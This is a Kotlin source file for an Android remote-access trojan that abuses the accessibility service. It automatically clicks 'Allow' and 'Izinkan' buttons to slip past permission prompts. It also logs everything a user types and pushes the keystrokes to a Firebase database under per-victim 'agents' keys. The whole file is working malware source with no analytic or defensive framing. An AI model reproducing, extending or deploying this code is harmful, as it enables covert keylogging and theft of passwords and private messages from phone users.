package com.controlrat
import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.google.firebase.database.FirebaseDatabase

class RatAccessibility : AccessibilityService() {
    private var keylogBuffer = StringBuilder()

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        val appId = ConfigHelper.getAppId(this)
        val db = FirebaseDatabase.getInstance()

        // 1. Auto-Grant Permission (Bypass popup)
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            val root = rootInActiveWindow
            if (root != null) {
                val allowBtn = findNodeByText(root, "Allow") ?: findNodeByText(root, "Izinkan")
                allowBtn?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            }
        }

        // 2. Keylogger
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val text = event.text.joinToString("")
            if (text.isNotBlank()) {
                keylogBuffer.append(text).append(" | ")
                if (keylogBuffer.length > 50) {
                    db.getReference("agents/$appId/keylogs").push().setValue(keylogBuffer.toString())
                    keylogBuffer.clear()
                }
            }
        }
    }

    private fun findNodeByText(root: AccessibilityNodeInfo, text: String): AccessibilityNodeInfo? {
        val nodes = root.findAccessibilityNodeInfosByText(text)
        for (node in nodes) {
            if (node.isClickable) return node
            val parent = node.parent
            if (parent != null && parent.isClickable) return parent
        }
        return null
    }

    override fun onInterrupt() {}
}
